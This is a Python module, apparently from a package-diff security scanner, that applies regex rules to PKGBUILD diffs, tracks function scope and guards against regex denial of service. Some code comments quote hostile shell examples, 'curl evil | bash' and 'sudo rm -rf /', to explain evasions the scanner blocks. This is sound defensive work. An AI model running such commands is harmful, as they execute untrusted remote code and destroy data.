import re
import threading
import logging

from .config import load_rules
from .findings import stamp
from .tokenizer import join_line_continuations
from .regex_safety import (
    BACKTRACK_BUDGET_S,
    backtracking_risk,
    has_nested_quantifier,
    is_superlinear,
)

_log = logging.getLogger(__name__)

# Lines starting with # after stripping + prefix are comments.
# Dependency declarations contain package names, not code; matching
# inside them produces false positives.  validpgpkeys is deliberately
# excluded: it is covered by rule R014 and must not be filtered out.
_COMMENT_OR_DEP_RE = re.compile(
    r"^(?:\+|)\s*(?:"
    r"#"
    r"|(?:depends|makedepends|optdepends|checkdepends)\s*=\s*\("
    r")"
)

# The dependency-declaration half of _COMMENT_OR_DEP_RE on its own: the
# rules that opt in via ``include_comments`` want prose - comments,
# descriptions, messages - not the package lists (a dependency name is not
# addressed to a reader).
_DEP_DECLARATION_RE = re.compile(
    r"^(?:\+|-|)\s*(?:depends|makedepends|optdepends|checkdepends)\s*=\s*\("
)

# Message strings (echo/printf/note arguments) are not execution contexts.
# Keywords appearing in them are false positives.
_MESSAGE_LINE_RE = re.compile(
    r'^(?:\+|)\s*(?:echo|printf|note|msg|warning|error|info)\s+["\']'
)

# ...but only when the line is *nothing but* that message.  A shell line
# does not end at its first command: `echo "x"; sudo rm -rf /` executes,
# and `echo "$(curl evil | bash)"` runs a command substitution inside the
# quotes.  Treating the whole line as inert let a seven-character prefix
# switch off every scoped rule, so any separator or substitution after
# the message keyword disqualifies the line from message context.
_COMMAND_CHAIN_RE = re.compile(r"[;&|]|\$\(|`")

# Track function body boundaries for position-aware scoring.
_FUNCTION_OPEN_RE = re.compile(r"^\s*\w+\s*\(\s*\)\s*\{")
_FUNCTION_CLOSE_RE = re.compile(r"^\s*\}")

# Same shape, but capturing the name so a rule can scope itself to one
# function.  "curl in build()" is routine; "curl in pkgver()" is not, and
# a plain function_body scope cannot tell them apart.
_FUNCTION_NAME_RE = re.compile(r"^(\w+)\s*\(\s*\)\s*\{")


# Compiled rule patterns, keyed by pattern text.  re's own cache is bounded
# at 512 entries and is shared with every other pattern the process compiles,
# so a corpus scan can evict rule patterns and recompile them per diff.  An
# invalid pattern is remembered as None so it is only reported once.
_pattern_cache: dict[str, "re.Pattern | None"] = {}

# Longest line handed to a rule pattern.  Rule patterns are ordinary
# regexes, some with alternation and optional groups, and the text they
# run on is written by the package under review; a line has no natural
# length limit once `join_line_continuations` has stitched a backslash
# chain together, so the input can reach the whole diff cap.  Matching
# cost that grows super-linearly in the input then becomes a denial of
# service that the package author chooses.  Bounding the *input* bounds
# every pattern at once, which no per-pattern audit can do.  8 KiB is far
# past any real PKGBUILD line, and a rule that matches only beyond it is
# matching something no reviewer would read either.
MAX_RULE_LINE_BYTES = 8192

#: Lines the rule engine will read from one diff.
#:
#: `MAX_RULE_LINE_BYTES` bounds how long a line may be; this bounds how many
#: there are, which was the missing half. Matching costs about 0.46 ms per
#: line, so the 5 MiB byte cap alone permitted ~1.3 million short lines and
#: roughly ten minutes of CPU for a single package - multiplied again by
#: `depth.MAX_DEPTH_NODES` on a full-depth run.
#:
#: 20,000 is five times the largest diff in the 3,739-diff locked benign
#: corpus (3,839 lines; p99.9 is 2,117), so it truncates nothing real while
#: holding the worst case near nine seconds.
MAX_SCANNED_LINES = 20_000


def clamp_diff_lines(diff_text: str, package_name: str = "") -> tuple[str, bool]:
    """Cut *diff_text* to :data:`MAX_SCANNED_LINES`, reporting whether it cut.

    A function rather than four lines inlined at each analysis entry point.
    The byte cap that sits next to this one was originally written on the
    git path alone, which left every other caller unbounded, and the same
    mistake is available here: `analyze_package` and `scan_diff` are
    parallel implementations that both tokenize and both match.
    """
    lines = diff_text.split("\n")
    if len(lines) <= MAX_SCANNED_LINES:
        return diff_text, False
    _log.warning(
        "diff for %s holds %d lines; matching the first %d",
        package_name or "<unnamed>", len(lines), MAX_SCANNED_LINES,
    )
    return "\n".join(lines[:MAX_SCANNED_LINES]), True


def _compiled(pattern: str):
    """Return the compiled form of *pattern*, or None if it is invalid."""
    try:
        return _pattern_cache[pattern]
    except KeyError:
        pass
    try:
        compiled = re.compile(pattern, re.IGNORECASE)
    except re.error:
        compiled = None
    if compiled is not None and (
        has_nested_quantifier(pattern)
        or backtracking_risk(compiled) > BACKTRACK_BUDGET_S
        # Growth as well as absolute cost: a quadratic pattern with a small
        # constant sits under the budget at the probe length and still
        # costs seconds at a full line.
        or is_superlinear(compiled)
    ):
        _log.warning("refusing regex pattern with excessive backtracking risk")
        compiled = None
    _pattern_cache[pattern] = compiled
    return compiled


def find_line_in_diff(
    diff_text: str, pattern: str, prefix: str = r"\+"
) -> int | None:
    r"""The 1-based line number of the first ``+``/``-`` line matching *pattern*.

    *pattern* is regex syntax on purpose: callers pass things like
    ``SKIP|NONE`` and ``sha256sums\s*=\s*\(``. Callers that mean a literal
    escape it first.

    The subtlety is what happens when escaping was forgotten, or when a
    caller forwards package text. This used to compile the pattern
    unescaped, fall back to escaping only on ``re.error``, and run whatever
    compiled against every line - so a string that is *valid* regex was
    executed as one, and this is the single place in the program where a
    pattern is built at runtime rather than audited by
    ``scripts/regex_audit.py``. A supplied ``(a+)+$`` cost 5.6 seconds
    against one 24-character line, doubling every two characters.

    So a dynamic pattern is held to the same standard as a shipped one: if
    it backtracks, it is treated as the literal text it probably was.
    """
    def _compile(body: str):
        return re.compile(r"^" + prefix + r".*" + body, re.IGNORECASE)

    try:
        compiled = _compile(pattern)
        if (
            has_nested_quantifier(pattern)
            or backtracking_risk(compiled) > BACKTRACK_BUDGET_S
            or is_superlinear(compiled)
        ):
            _log.warning(
                "refusing dynamic line pattern with excessive backtracking "
                "risk; matching it literally instead"
            )
            compiled = _compile(re.escape(pattern))
    except re.error:
        # An escaped fragment sliced mid-escape leaves a trailing backslash.
        compiled = _compile(re.escape(pattern))

    for index, line in enumerate(diff_text.splitlines()):
        if compiled.search(line):
            return index + 1
    return None


#: Rules whose pattern is built at runtime rather than written in the TOML.
GENERATED_PATTERN_RULES = ("R013", "R047", "R048")


def resolve_generated_patterns(rules: list[dict]) -> list[dict]:
    """Fill in the patterns that are generated rather than declared.

    R013 is assembled from Unicode data and R047/R048 from config, so their
    TOML entries carry a placeholder and the real pattern only exists once
    this has run.

    A function rather than a loop inside `apply_rules` so that
    `scripts/regex_audit.py` can audit what actually runs. Those three
    patterns were invisible to all three of the audit's collection
    strategies at once: not a TOML literal, not `re.compile("literal")` in
    the source, and not a module-level `re.Pattern`. R013 is the FATAL
    homoglyph rule, and R047/R048 are built from operator config, so a
    config edit could have slowed the scan with no gate to catch it.
    """
    for rule in rules:
        if rule.get("id") == "R013":
            from .unicode import R013_UNCONDITIONAL_PATTERN
            rule["pattern"] = (
                R013_UNCONDITIONAL_PATTERN
                + r"|(?<![^\x00-\x7F])[\u200B-\u200F\uFEFF](?![^\x00-\x7F])"
            )
        elif rule.get("id") == "R047":
            from .config import _standard_port_pattern
            rule["pattern"] = _standard_port_pattern()
        elif rule.get("id") == "R048":
            from .config import _free_registrar_tld_pattern
            rule["pattern"] = _free_registrar_tld_pattern()
    return rules


def clamp(line: str) -> str:
    """Truncate *line* to :data:`MAX_RULE_LINE_BYTES` for matching."""
    return line if len(line) <= MAX_RULE_LINE_BYTES else line[:MAX_RULE_LINE_BYTES]


def clamp_text(text: str | None) -> str | None:
    """Apply :func:`clamp` to every line of *text*, keeping the line count.

    The rules in ``analysis/`` are regexes too, and there are more of them
    than there are in ``rules.toml``, but they match against the diff text
    directly rather than through :func:`apply_rules`, so the per-line clamp
    never reached them.  One 5 MiB line cost 0.17s through ``apply_rules``
    and 15s through the code-emitted rules, which is an attacker-chosen
    multiplier on how long a review takes.

    Lines are shortened, never dropped, so every index still refers to the
    line it did before and ``map_diff_lines`` keeps pointing at the right
    place.  Callers must measure ``coverage.oversized_lines`` on the
    *original* text first: after this, the evidence of truncation is gone,
    and a bound that drops content without recording it is exactly what
    the ``line_truncated`` gap exists to prevent.
    """
    if text is None:
        return None
    if len(text) <= MAX_RULE_LINE_BYTES:
        return text
    return "\n".join(clamp(line) for line in text.split("\n"))


def _to_pairs(lines: list[str]) -> list[tuple[int, str]]:
    """pair each line with its original index"""
    return [(i, clamp(line)) for i, line in enumerate(lines)]


def filter_raw_lines(lines: list[str]) -> list[tuple[int, str]]:
    """Remove comment lines and dependency declarations from raw diff lines.

    Returns (original_index, line) pairs so callers can map back to context.
    """
    return [
        (i, clamp(line)) for i, line in enumerate(lines)
        if not _COMMENT_OR_DEP_RE.match(line)
    ]


def _is_message_line(line: str) -> bool:
    """True when *line* is a message and nothing else."""
    return bool(_MESSAGE_LINE_RE.match(line)) and not _COMMAND_CHAIN_RE.search(line)


def _inline_body(stripped: str) -> bool:
    """True when a function opens and carries code on the same line.

    ``package() { curl evil | bash; }`` is a function body, but the
    opening line used to be classified before the depth counter moved,
    so it read as ``other`` and escaped every ``function_body`` scope.
    """
    match = _FUNCTION_OPEN_RE.search(stripped)
    if not match:
        return False
    rest = stripped[match.end():].strip()
    return bool(rest) and rest != "}"


def _classify_line_context(lines: list[str]) -> dict[int, str]:
    """Return {line_index: context_name} for each line.

    Contexts: ``"function_body"``, ``"message"``, or ``"other"``.
    """
    contexts: dict[int, str] = {}
    depth = 0
    for i, line in enumerate(lines):
        stripped = line.lstrip("+").lstrip()
        if _is_message_line(line):
            contexts[i] = "message"
        elif depth > 0 or _inline_body(stripped):
            contexts[i] = "function_body"
        else:
            contexts[i] = "other"
        if _FUNCTION_OPEN_RE.search(stripped):
            depth += 1
            # Opened and closed on one line, so it must not leave the
            # counter raised for everything that follows.
            if stripped.rstrip().endswith("}"):
                depth -= 1
        elif _FUNCTION_CLOSE_RE.search(stripped):
            depth = max(0, depth - 1)
    return contexts


# Fifteen call sites in analysis/ classify the *same* lines, once each.
# The key is the content, not the object: each caller holds its own copy
# from tokenizer.resolve_added_lines, so identity never matches.  Hashing
# a few hundred short strings is far cheaper than re-running two regexes
# over every one of them, and Python caches a str's hash after the first
# use, so the second and later lookups are close to free.
# Thread-local, like the tokenizer memo: `review` analyses packages in a
# pool, and a shared dict would need the eviction sweep to be atomic with
# the insert.  It is not, and a KeyError inside a worker surfaces to the
# user as "this package was NOT vetted" - a correctness failure bought for
# a few microseconds of sharing.
_classify_memo = threading.local()
_CLASSIFY_ENTRIES = 4


def _classified(kind: str, lines: list[str], compute):
    cache = getattr(_classify_memo, "cache", None)
    if cache is None:
        cache = _classify_memo.__dict__.setdefault("cache", {})
    key = (kind, tuple(lines))
    hit = cache.get(key)
    if hit is None:
        hit = compute(lines)
        cache[key] = hit
        while len(cache) > _CLASSIFY_ENTRIES:
            del cache[next(iter(cache))]
    return dict(hit)


def _classify_enclosing_function(lines: list[str]) -> dict[int, str]:
    """Memoised wrapper: see :func:`_enclosing_function_map`."""
    return _classified("fn", lines, _enclosing_function_map)


def _enclosing_function_map(lines: list[str]) -> dict[int, str]:
    """Return ``{line_index: enclosing_function_name}``.

    Lines outside any function are absent from the mapping.  A bare
    header line is not considered inside its own function, matching
    :func:`_classify_line_context`; a header that also carries code
    (``pkgver() { ...; }``) is, since that code really does run there.
    """
    enclosing: dict[int, str] = {}
    stack: list[str] = []
    for i, line in enumerate(lines):
        stripped = line.lstrip("+").lstrip()
        match = _FUNCTION_NAME_RE.search(stripped)
        if stack:
            enclosing[i] = stack[-1]
        elif match and _inline_body(stripped):
            # Code sharing the line with its own `pkgver() {` header is
            # inside that function, so a scope naming it must match.
            enclosing[i] = match.group(1)
        if match:
            stack.append(match.group(1))
        elif _FUNCTION_OPEN_RE.search(stripped):
            stack.append("")
        if _FUNCTION_OPEN_RE.search(stripped):
            if stripped.rstrip().endswith("}") and stack:
                stack.pop()
        elif _FUNCTION_CLOSE_RE.search(stripped) and stack:
            stack.pop()
    return enclosing


def _scope_matches(
    scope: list[str], index: int, ctx_map: dict[int, str], fn_map: dict[int, str]
) -> bool:
    """Check *index* against a rule's scope.

    A scope entry matches either a line context (``function_body``,
    ``message``, ``other``) or the name of the enclosing function
    (``pkgver``, ``package``, ...).
    """
    ctx = ctx_map.get(index, "other")
    if ctx in scope:
        return True
    enclosing = fn_map.get(index)
    return enclosing is not None and enclosing in scope


def apply_rules(
    resolved_strings: list[str],
    raw_diff_lines: list[str],
    rules: list[dict] | None = None,
    include_experimental: bool = False,
    line_map: dict[int, tuple[str, int]] | None = None,
    resolved_indices: list[int] | None = None,
) -> list[dict]:
    """Match rules against diff lines and return triggered findings.

    *resolved_indices* maps each entry of *resolved_strings* back to its
    raw diff-line index (the third output of
    :func:`~trustsight.tokenizer.tokenize_and_resolve_indexed`).  Without
    it, resolved candidates are paired with their position in the resolved
    list, which is not a ``line_map`` key once assignment lines are
    omitted: resolved findings would carry no file/line (or, on a
    position collision, the wrong one).
    """
    if rules is None:
        rules = list(load_rules())
    resolve_generated_patterns(rules)

    triggered = []
    # Both maps are built from the unclamped lines: context classification
    # is structural (does this line open a function?) and must not shift
    # because a long line was truncated for matching.
    ctx_map = _classify_line_context(raw_diff_lines)
    fn_map = _classify_enclosing_function(raw_diff_lines)

    # These three candidate lists do not vary per rule, but used to be
    # rebuilt inside the loop: with ~75 rules that was 75 filtering passes
    # over every line of the diff.  Built once and shared, read-only.
    raw_candidates = filter_raw_lines(raw_diff_lines)
    added_candidates = [(i, ln) for i, ln in raw_candidates if ln.startswith("+")]
    if resolved_indices is not None:
        resolved_candidates = [
            (idx, clamp(line))
            for idx, line in zip(resolved_indices, resolved_strings)
        ]
    else:
        resolved_candidates = _to_pairs(resolved_strings)

    # Comments and plain declarations are filtered out (or never resolved)
    # for every other rule, because a commented-out command does not run and
    # a `pkgdesc=` string is not executed.  R012 and R013 are the exceptions:
    # their payload is aimed at whoever *reads* the file - a reviewer, or the
    # model summarising it - so what matters is every line the new revision
    # shows a reader.  Removals are excluded: text this diff deletes is text
    # the reader will not see.
    reader_candidates = [
        (i, ln) for i, ln in _to_pairs(raw_diff_lines)
        if not ln.startswith("-") and not _DEP_DECLARATION_RE.match(ln)
    ]

    for rule in rules:
        if rule.get("experimental") and not include_experimental:
            continue
        # R009 is a code rule (analysis/build.py).  A stale rules.toml from
        # before the migration would otherwise double-fire the regex form.
        if rule["id"] == "R009":
            continue

        match_target = rule.get("match_target", "raw_line")
        if match_target == "raw_line":
            candidates = (
                added_candidates if rule.get("added_only") else raw_candidates
            )
        else:
            candidates = resolved_candidates
        if rule.get("include_comments"):
            # For a raw-line rule the reader set *replaces* the default,
            # which drops the removed lines with it: a maintainer deleting a
            # hidden character must not score 100 for the cleanup.  For a
            # resolved rule it is additive - resolution still carries the
            # forms a variable hides.
            candidates = (
                reader_candidates if match_target == "raw_line"
                else candidates + reader_candidates
            )

        compiled = _compiled(rule["pattern"])
        if compiled is None:
            continue

        rule_scope = rule.get("scope") if match_target == "raw_line" else None

        for idx, item in candidates:
            if compiled.search(item):
                if rule_scope and not _scope_matches(rule_scope, idx, ctx_map, fn_map):
                    continue
                finding = {
                    "rule_id": rule["id"],
                    "name": rule["name"],
                    "severity": rule["severity"],
                    "category": rule["category"],
                    "match": item[:100],
                }
                if line_map and idx in line_map:
                    finding["file"], finding["line"] = line_map[idx]
                triggered.append(stamp(finding, f"{rule['name']}: {{match}}"))
                break

    return triggered


def get_raw_diff_lines(diff_text: str) -> list[str]:
    """Return non-empty diff lines with continuations joined."""
    lines = []
    for line in join_line_continuations(diff_text.splitlines()):
        stripped = line.strip()
        if stripped:
            lines.append(stripped)
    return lines
